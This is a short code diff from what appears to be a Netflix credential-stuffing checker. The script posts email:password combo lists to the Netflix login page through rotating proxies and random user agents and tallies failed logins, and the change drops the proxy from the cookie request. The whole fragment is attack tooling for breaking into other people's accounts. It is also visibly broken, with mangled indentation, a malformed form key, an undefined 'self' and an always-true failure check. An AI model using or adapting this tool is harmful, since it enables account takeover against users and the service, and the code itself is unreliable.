@@ -301,7 +301,7 @@ def netflix_login(combos):
     data = {"userLoginId:": combo.split(":")[0], "password": combo.split(":")[1], "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
             
     request = client.post("https://www.netflix.com/login",headers =headers, data =data ,proxies =random.choice(self.proxies))
-            cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies)).cookies.get("flwssn"))
+    cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}).cookies.get("flwssn"))
             
     if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
                 bad += 1
